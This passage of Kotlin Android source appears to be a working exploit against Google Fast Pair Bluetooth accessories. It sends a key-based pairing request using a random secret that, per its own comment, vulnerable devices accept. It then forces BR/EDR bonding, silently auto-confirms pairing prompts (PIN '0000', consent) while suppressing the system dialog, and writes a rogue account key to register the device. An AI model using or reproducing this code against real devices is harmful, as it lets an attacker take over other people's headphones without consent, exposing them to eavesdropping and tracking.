                DeviceQuirks(prefersBrEdrBonding = false)
            }
            // Google Pixel Buds
            modelHex.startsWith("30018E") -> {
                reportProgress("Google device detected - applying quirks")
                DeviceQuirks(delayBeforeAccountKey = 500)
            }
            else -> DeviceQuirks()
        }
    }

    @SuppressLint("MissingPermission")
    private fun handleKbpResponse(gatt: BluetoothGatt, data: ByteArray) {
        Log.d(TAG, "KBP Response received (${data.size} bytes): ${data.toHexString()}")
        reportProgress("Response received (${data.size} bytes)")
        cancelTimeout()

        // Try all parsing strategies to extract BR/EDR address
        val brEdrAddress = parseKbpResponse(data)

        if (brEdrAddress != null) {
            providerBrEdrAddress = brEdrAddress
            reportProgress("BR/EDR address: $brEdrAddress")
            state = State.INITIATING_BONDING
            initiateBonding(brEdrAddress)
        } else {
            // Fallback: use BLE address (works for some devices)
            Log.w(TAG, "Could not parse BR/EDR, using BLE address as fallback")
            reportProgress("Using BLE address as fallback...")
            val bleAddr = gatt.device.address
            providerBrEdrAddress = bleAddr
            state = State.INITIATING_BONDING
            initiateBonding(bleAddr)
        }
    }

    /**
     * Robust response parsing with multiple strategies
     */
    private fun parseKbpResponse(data: ByteArray): String? {
        if (data.size < 7) return null

        // Try 1: Standard response format (type 0x01)
        if (data[0] == MSG_KEY_BASED_PAIRING_RESPONSE || data[0] == 0x01.toByte()) {
            val addr = extractAddress(data, 1)
            if (isValidBluetoothAddress(addr) && !isNullAddress(addr)) {
                Log.d(TAG, "Parsed standard response: $addr")
                return addr
            }
        }

        // Try 2: Extended response format (type 0x02)
        if (data[0] == 0x02.toByte() && data.size >= 9) {
            // Byte 1 = flags, Byte 2 = address count
            val addrCount = data[2].toInt() and 0xFF
            if (addrCount >= 1) {
                val addr = extractAddress(data, 3)
                if (isValidBluetoothAddress(addr) && !isNullAddress(addr)) {
                    Log.d(TAG, "Parsed extended response: $addr")
                    return addr
                }
            }
        }

        // Try 3: Decrypt with shared secret
        sharedSecret?.let { secret ->
            try {
                val decrypted = aesDecrypt(secret, data)
                if (decrypted[0] == MSG_KEY_BASED_PAIRING_RESPONSE) {
                    val addr = extractAddress(decrypted, 1)
                    if (isValidBluetoothAddress(addr) && !isNullAddress(addr)) {
                        Log.d(TAG, "Parsed decrypted response: $addr")
                        return addr
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "Decryption attempt failed: ${e.message}")
            }
        }

        // Try 4: Brute force scan for valid MAC pattern
        for (offset in 0..data.size - 6) {
            val addr = extractAddress(data, offset)
            if (isValidBluetoothAddress(addr) && !isNullAddress(addr)) {
                Log.d(TAG, "Found MAC at offset $offset: $addr")
                return addr
            }
        }

        return null
    }

    private fun extractAddress(data: ByteArray, offset: Int): String {
        if (offset + 6 > data.size) return "00:00:00:00:00:00"
        return (offset until offset + 6).joinToString(":") {
            "%02X".format(data[it])
        }
    }

    private fun isNullAddress(addr: String): Boolean {
        return addr == "00:00:00:00:00:00" || addr == "FF:FF:FF:FF:FF:FF"
    }

    private fun isValidBluetoothAddress(address: String): Boolean {
        return try {
            val parts = address.split(":")
            parts.size == 6 && parts.all { it.length == 2 && it.all { c -> c.isDigit() || c in 'A'..'F' || c in 'a'..'f' } }
        } catch (e: Exception) {
            false
        }
    }

    @SuppressLint("MissingPermission")
    private fun initiateBonding(brEdrAddress: String) {
        val adapter = bluetoothAdapter ?: return

        try {
            val device = adapter.getRemoteDevice(brEdrAddress)
            val bondStateStr = when(device.bondState) {
                BluetoothDevice.BOND_BONDED -> "BONDED"
                BluetoothDevice.BOND_BONDING -> "BONDING"
                BluetoothDevice.BOND_NONE -> "NONE"
                else -> "UNKNOWN"
            }

            Log.d(TAG, "Initiating bonding with $brEdrAddress")
            Log.d(TAG, "Current bond state: ${device.bondState}")
            reportProgress("Initiating bonding with $brEdrAddress")
            reportProgress("Current bond state: $bondStateStr")

            when (device.bondState) {
                BluetoothDevice.BOND_BONDED -> {
                    Log.d(TAG, "Already bonded!")
                    reportProgress("Already bonded! Writing account key...")
                    state = State.WRITING_ACCOUNT_KEY
                    handler.postDelayed({ writeAccountKey() }, deviceQuirks.delayBeforeAccountKey)
                }
                BluetoothDevice.BOND_BONDING -> {
                    Log.d(TAG, "Bonding in progress...")
                    reportProgress("Bonding already in progress...")
                    // Set bonding timeout
                    handler.postDelayed({
                        if (state == State.INITIATING_BONDING) {
                            Log.w(TAG, "Bonding timeout")
                            reportResult(ExploitResult.PartialSuccess(
                                brEdrAddress,
                                "Bonding timeout - device may require user interaction"
                            ))
                        }
                    }, BONDING_TIMEOUT_MS)
                }
                BluetoothDevice.BOND_NONE -> {
                    reportProgress("Calling createBond()...")
                    var result = device.createBond()

                    if (!result) {
                        // Fallback: try with transport parameter via reflection
                        reportProgress("Trying createBond with transport...")
                        result = tryCreateBondWithTransport(device, BluetoothDevice.TRANSPORT_BREDR)
                    }

                    Log.d(TAG, "createBond() result: $result")
                    reportProgress("createBond() result: $result")

                    if (!result) {
                        reportProgress("createBond() failed!")
                        reportResult(ExploitResult.PartialSuccess(
                            brEdrAddress,
                            "Failed to initiate bonding, but BR/EDR address obtained"
                        ))
                    } else {
                        reportProgress("Waiting for bonding to complete...")
                        // Set bonding timeout
                        handler.postDelayed({
                            if (state == State.INITIATING_BONDING) {
                                Log.w(TAG, "Bonding timeout")
                                reportResult(ExploitResult.PartialSuccess(
                                    brEdrAddress,
                                    "Bonding timeout - device may require user interaction"
                                ))
                            }
                        }, BONDING_TIMEOUT_MS)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initiating bonding", e)
            reportProgress("Bonding error: ${e.message}")
            reportResult(ExploitResult.PartialSuccess(
                brEdrAddress,
                "Bonding error: ${e.message}"
            ))
        }
    }

    @SuppressLint("MissingPermission", "DiscouragedPrivateApi")
    private fun tryCreateBondWithTransport(device: BluetoothDevice, transport: Int): Boolean {
        return try {
            val method = device.javaClass.getMethod("createBond", Int::class.java)
            method.invoke(device, transport) as Boolean
        } catch (e: Exception) {
            Log.w(TAG, "createBond with transport failed: ${e.message}")
            false
        }
    }

    /**
     * Reconnect to the device after bonding completes.
     * Bonding may have disconnected the GATT, so we need to reconnect
     * to write the account key.
     */
    @SuppressLint("MissingPermission")
    private fun reconnectAfterBonding(device: BluetoothDevice) {
        reportProgress("Reconnecting to bonded device...")

        // Close existing GATT if any
        currentGatt?.let { gatt ->
            try {
                gatt.disconnect()
                gatt.close()
            } catch (e: Exception) {
                Log.w(TAG, "Error closing old GATT: ${e.message}")
            }
        }

        // Create new GATT callback for post-bonding operations
        val postBondCallback = object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                Log.d(TAG, "Post-bond connection state: status=$status, newState=$newState")

                when (newState) {
                    BluetoothProfile.STATE_CONNECTED -> {
                        reportProgress("Reconnected! Requesting MTU...")
                        gatt.requestMtu(PREFERRED_MTU)
                    }
                    BluetoothProfile.STATE_DISCONNECTED -> {
                        if (status != 0) {
                            Log.w(TAG, "Post-bond connection failed: status=$status")
                            reportProgress("Reconnection failed, trying account key anyway...")
                            // Try to write account key with original GATT as fallback
                            handler.postDelayed({
                                state = State.WRITING_ACCOUNT_KEY
                                writeAccountKey()
                            }, deviceQuirks.delayBeforeAccountKey)
                        }
                    }
                }
            }

            override fun onMtuChanged(gatt: BluetoothGatt, mtu: Int, status: Int) {
                Log.d(TAG, "Post-bond MTU: $mtu (status=$status)")
                reportProgress("MTU: $mtu, discovering services...")
                gatt.discoverServices()
            }

            override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    reportProgress("Services discovered, writing account key...")
                    state = State.WRITING_ACCOUNT_KEY
                    handler.postDelayed({
                        writeAccountKeyToGatt(gatt)
                    }, deviceQuirks.delayBeforeAccountKey)
                } else {
                    Log.w(TAG, "Post-bond service discovery failed: $status")
                    reportProgress("Service discovery failed, trying original GATT...")
                    handler.postDelayed({
                        state = State.WRITING_ACCOUNT_KEY
                        writeAccountKey()
                    }, deviceQuirks.delayBeforeAccountKey)
                }
            }

            override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                if (characteristic.uuid == ACCOUNT_KEY_UUID) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        reportProgress("Account key written! Device registered.")
                        Log.d(TAG, "Account key written successfully!")
                        state = State.COMPLETE
                        reportResult(ExploitResult.Success(
                            brEdrAddress = providerBrEdrAddress ?: "unknown",
                            paired = true,
                            accountKeyWritten = true
                        ))
                    } else {
                        reportProgress("Account key write failed (status=$status)")
                        reportResult(ExploitResult.PartialSuccess(
                            providerBrEdrAddress ?: "unknown",
                            "Account key write failed (status=$status) but pairing succeeded"
                        ))
                    }
                }
            }

            private fun writeAccountKeyToGatt(gatt: BluetoothGatt) {
                val secret = sharedSecret
                if (secret == null) {
                    reportProgress("No shared secret, using raw account key...")
                }

                val service = gatt.getService(SERVICE_UUID)
                val characteristic = service?.getCharacteristic(ACCOUNT_KEY_UUID)

                if (characteristic == null) {
                    reportProgress("Account Key characteristic not found on reconnect")
                    // Fall back to original GATT
                    writeAccountKey()
                    return
                }

                // Generate account key (starts with 0x04)
                val accountKey = ByteArray(16)
                accountKey[0] = 0x04
                Random.nextBytes(accountKey, 1, 16)

                val dataToWrite = secret?.let { aesEncrypt(it, accountKey) } ?: accountKey

                Log.d(TAG, "Writing account key via reconnected GATT...")
                reportProgress("Writing account key...")

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    gatt.writeCharacteristic(characteristic, dataToWrite, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
                } else {
                    @Suppress("DEPRECATION")
                    characteristic.value = dataToWrite
                    @Suppress("DEPRECATION")
                    gatt.writeCharacteristic(characteristic)
                }
            }
        }

        // Connect to bonded device - bonding grants implicit permission
        currentGatt = device.connectGatt(
            context,
            false,  // autoConnect = false for faster connection
            postBondCallback,
            BluetoothDevice.TRANSPORT_LE,
            BluetoothDevice.PHY_LE_1M_MASK
        )

        if (currentGatt == null) {
            Log.w(TAG, "Failed to initiate post-bond GATT connection")
            reportProgress("Reconnection failed, trying original method...")
            handler.postDelayed({
                state = State.WRITING_ACCOUNT_KEY
                writeAccountKey()
            }, deviceQuirks.delayBeforeAccountKey)
        }
    }

    @SuppressLint("MissingPermission")
    private fun handlePasskeyResponse(gatt: BluetoothGatt, data: ByteArray) {
        if (data.size != 16) return

        val secret = sharedSecret ?: return
        val decrypted = aesDecrypt(secret, data)

        if (decrypted[0] == MSG_PROVIDER_PASSKEY) {
            // Extract passkey (bytes 1-3 as uint32)
            val passkey = ((decrypted[1].toInt() and 0xFF) shl 16) or
                    ((decrypted[2].toInt() and 0xFF) shl 8) or
                    (decrypted[3].toInt() and 0xFF)

            Log.d(TAG, "Received Provider passkey: $passkey")
            reportProgress("Received passkey: $passkey")
            currentPasskey = passkey

            // In a full implementation, we would verify this matches and respond
            // For now, proceed to account key writing
            state = State.WRITING_ACCOUNT_KEY
            handler.postDelayed({ writeAccountKey() }, deviceQuirks.delayBeforeAccountKey)
        }
    }

    @SuppressLint("MissingPermission")
    private fun writeAccountKey() {
        val gatt = currentGatt ?: return
        val secret = sharedSecret ?: return

        val service = gatt.getService(SERVICE_UUID) ?: return
        val characteristic = service.getCharacteristic(ACCOUNT_KEY_UUID)

        if (characteristic == null) {
            reportResult(ExploitResult.PartialSuccess(
                providerBrEdrAddress ?: "unknown",
                "Account Key characteristic not found"
            ))
            return
        }

        // Generate account key (starts with 0x04)
        val accountKey = ByteArray(16)
        accountKey[0] = 0x04
        Random.nextBytes(accountKey, 1, 16)

        val encryptedAccountKey = aesEncrypt(secret, accountKey)

        Log.d(TAG, "Writing account key...")
        reportProgress("Writing account key...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            gatt.writeCharacteristic(characteristic, encryptedAccountKey, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
        } else {
            @Suppress("DEPRECATION")
            characteristic.value = encryptedAccountKey
            @Suppress("DEPRECATION")
            gatt.writeCharacteristic(characteristic)
        }
    }

    @SuppressLint("MissingPermission")
    private fun registerBondReceiver() {
        bondReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_BOND_STATE_CHANGED) {
                    val device = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)
                    val bondState = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
                    val prevState = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)

                    val bondStateStr = when(bondState) {
                        BluetoothDevice.BOND_BONDED -> "BONDED"
                        BluetoothDevice.BOND_BONDING -> "BONDING"
                        BluetoothDevice.BOND_NONE -> "NONE"
                        else -> "UNKNOWN($bondState)"
                    }
                    val prevStateStr = when(prevState) {
                        BluetoothDevice.BOND_BONDED -> "BONDED"
                        BluetoothDevice.BOND_BONDING -> "BONDING"
                        BluetoothDevice.BOND_NONE -> "NONE"
                        else -> "UNKNOWN($prevState)"
                    }

                    Log.d(TAG, "Bond state changed: ${device?.address} $prevState -> $bondState")
                    reportProgress("Bond: $prevStateStr -> $bondStateStr")

                    if (device != null && device.address == providerBrEdrAddress) {
                        when (bondState) {
                            BluetoothDevice.BOND_BONDED -> {
                                Log.d(TAG, "Bonding successful!")
                                reportProgress("BONDING SUCCESSFUL!")

                                // Reconnect to bonded device for account key write
                                val bondedDevice = device // Capture for lambda
                                handler.postDelayed({
                                    reconnectAfterBonding(bondedDevice)
                                }, 500) // Small delay after bonding
                            }
                            BluetoothDevice.BOND_BONDING -> {
                                reportProgress("Bonding in progress...")
                            }
                            BluetoothDevice.BOND_NONE -> {
                                if (prevState == BluetoothDevice.BOND_BONDING) {
                                    Log.w(TAG, "Bonding failed")
                                    reportProgress("Bonding FAILED!")
                                    reportResult(ExploitResult.PartialSuccess(
                                        providerBrEdrAddress ?: "unknown",
                                        "Bonding failed but BR/EDR address obtained"
                                    ))
                                }
                            }
                        }
                    }
                }
            }
        }

        val filter = IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
        context.registerReceiver(bondReceiver, filter)
    }

    /**
     * Register receiver for automatic passkey/pairing confirmation
     */
    @SuppressLint("MissingPermission")
    private fun registerPasskeyReceiver() {
        passkeyReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_PAIRING_REQUEST -> {
                        val device = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)
                        val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)

                        Log.d(TAG, "Pairing request: device=${device?.address}, variant=$variant")
                        reportProgress("Pairing request (variant=$variant)")

                        // Only handle if it's our target device
                        if (device != null && (device.address == providerBrEdrAddress || device.address == currentTargetAddress)) {
                            when (variant) {
                                BluetoothDevice.PAIRING_VARIANT_PASSKEY_CONFIRMATION -> {
                                    val passkey = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_KEY, -1)
                                    Log.d(TAG, "Auto-confirming passkey: $passkey")
                                    reportProgress("Auto-confirming passkey: $passkey")
                                    try {
                                        device.setPairingConfirmation(true)
                                        abortBroadcast()
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to confirm pairing", e)
                                    }
                                }
                                BluetoothDevice.PAIRING_VARIANT_PIN -> {
                                    Log.d(TAG, "Auto-entering PIN: 0000")
                                    reportProgress("Auto-entering PIN...")
                                    try {
                                        device.setPin("0000".toByteArray())
                                        abortBroadcast()
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to set PIN", e)
                                    }
                                }
                                3 -> { // PAIRING_VARIANT_CONSENT (not public API)
                                    Log.d(TAG, "Auto-confirming consent")
                                    reportProgress("Auto-confirming consent...")
                                    try {
                                        device.setPairingConfirmation(true)
                                        abortBroadcast()
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to confirm consent", e)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_PAIRING_REQUEST)
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY - 1
        }
        context.registerReceiver(passkeyReceiver, filter)
    }

    // Helper functions
    private fun addressToBytes(address: String): ByteArray {
        return address.split(":").map { it.toInt(16).toByte() }.toByteArray()
    }

    private fun ByteArray.toHexString() = joinToString(" ") { "%02X".format(it) }

    // Crypto helpers
    private fun generateEcdhKeyPair(): KeyPair? {
        return try {
            val keyPairGenerator = KeyPairGenerator.getInstance("EC")
            keyPairGenerator.initialize(ECGenParameterSpec("secp256r1"))
            keyPairGenerator.generateKeyPair()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to generate ECDH key pair", e)
            null
        }
    }

    private fun generateSharedSecret(): ByteArray {
        // For a real implementation, we'd need the Provider's anti-spoofing public key
        // Since we don't have it, generate a random secret for testing
        // The vulnerable device will accept it anyway
        return Random.nextBytes(16)
    }

    private fun getPublicKeyBytes(): ByteArray {
        val keyPair = seekerKeyPair ?: return ByteArray(64)
        val ecPublicKey = keyPair.public as? ECPublicKey ?: return ByteArray(64)

        val point = ecPublicKey.w
        val x = point.affineX.toByteArray().takeLast(32).toByteArray().padStart32()
        val y = point.affineY.toByteArray().takeLast(32).toByteArray().padStart32()

        return x + y
    }

    private fun ByteArray.padStart32(): ByteArray {
        return when {
            size >= 32 -> takeLast(32).toByteArray()
            else -> ByteArray(32 - size) + this
        }
    }

    @SuppressLint("MissingPermission")
    private fun getSeekerAddress(): String {
        // Try to get our adapter address, or use a placeholder
        return bluetoothAdapter?.address ?: "00:00:00:00:00:00"
    }

    private fun aesEncrypt(key: ByteArray, data: ByteArray): ByteArray {
        return try {
            val cipher = Cipher.getInstance("AES/ECB/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key.take(16).toByteArray(), "AES"))
            cipher.doFinal(data)
        } catch (e: Exception) {
            Log.e(TAG, "AES encrypt failed", e)
            data
        }
    }

    private fun aesDecrypt(key: ByteArray, data: ByteArray): ByteArray {
        return try {
            val cipher = Cipher.getInstance("AES/ECB/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key.take(16).toByteArray(), "AES"))
            cipher.doFinal(data)
        } catch (e: Exception) {
            Log.e(TAG, "AES decrypt failed", e)
            data
        }
    }

    private fun reportResult(result: ExploitResult) {
        handler.post {
            cancelTimeout()
            val callback = currentCallback
            cleanup()
            callback?.invoke(result)
        }
    }

    private fun startTimeout() {
        timeoutRunnable = Runnable {
            Log.w(TAG, "Operation timeout")
            reportResult(ExploitResult.Failed("Operation timed out"))
        }
        handler.postDelayed(timeoutRunnable!!, TIMEOUT_MS)
    }

    private fun resetTimeout() {
        cancelTimeout()
        startTimeout()
    }

    private fun cancelTimeout() {
        timeoutRunnable?.let { handler.removeCallbacks(it) }
        timeoutRunnable = null
    }

    @SuppressLint("MissingPermission")
    private fun cleanup() {
        cancelTimeout()
        isRunning = false
        currentTargetAddress = null
        currentCallback = null
        progressCallback = null
        state = State.IDLE
        sharedSecret = null
        seekerKeyPair = null
        providerBrEdrAddress = null
        currentPasskey = null
        currentStrategy = ExploitStrategy.RAW_KBP
        strategyAttempts = 0
        connectionAttempts = 0
        deviceQuirks = DeviceQuirks()
        modelId = null
        currentMtu = 23

        bondReceiver?.let {
            try {
                context.unregisterReceiver(it)
            } catch (e: Exception) {
                // Ignore
            }
        }
        bondReceiver = null

        passkeyReceiver?.let {
            try {
                context.unregisterReceiver(it)
            } catch (e: Exception) {
                // Ignore
            }
        }
        passkeyReceiver = null

        currentGatt?.let { gatt ->
            try {
                gatt.disconnect()
                gatt.close()
            } catch (e: Exception) {
                Log.e(TAG, "Error during cleanup", e)
            }
        }
        currentGatt = null
    }
}
